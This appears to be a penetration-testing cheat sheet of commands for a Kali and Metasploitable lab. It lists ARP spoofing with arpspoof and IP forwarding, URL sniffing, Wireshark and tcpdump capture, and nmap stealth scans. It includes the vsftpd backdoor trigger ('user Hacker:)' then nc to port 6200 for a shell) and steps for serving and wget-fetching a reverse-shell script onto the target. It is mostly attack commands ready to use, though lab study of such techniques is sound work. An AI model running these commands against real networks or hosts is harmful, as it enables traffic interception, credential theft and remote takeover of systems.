- dsniff tool contains arpspoof utility
```bash apt install dsniff```

- allow ip forwarding till next restart
```bash echo 1 > /proc/sys/net/ipv4/ip_forward```

- arpspoof to spoof both the router and the victim
```bash arpspoof -i eth0 -t <VICTIM_IP> <ROUTER_IP>```
```bash arpspoof -i eth0 -t <ROUTER_IP> <VICTIM_IP>```

- intercept urls from spoofed communication
```bash urlsnarf -i eth0```

- wireshark filter expressions
```wireshark
# WS Filter expression structure
[Protocol].[header/field] [operator: +,==,!=] [value]
```
```wireshark ip.src == 192.168.1.101```
```wireshark tcp contains login```
```wireshark ip.src == 192.168.1.101 | ip.dst == 192.168.1.101```

- tcpdump
```bash tcpdump -i <interface> port <port> -w <file.pcap>```

- nmap tcp synscan
```bash nmap -sS <ip or cidr>```
- nmap tcp finscan
```bash nmap -sF <ip or cidr>```
- nmap tcp xmasscan
```bash nmap -sX <ip or cidr>```

- connect to vulnerable metasploit service
```bash 
nc <Metasploitable IP address> 21
# When process opened
user Hacker:)
pass invalid
```

- on a different shell and you'll get full prompt
```bash nc <Metasploitable IP address> 6200```

- start python local server from which the metaspolitable server will able to wget the reverseShell.py file
```bash python3 -m http.server 8080```

- wget the file from metasploitable after connecting with nc
```bash wget <Kali IP>:8080/reverseShell.py```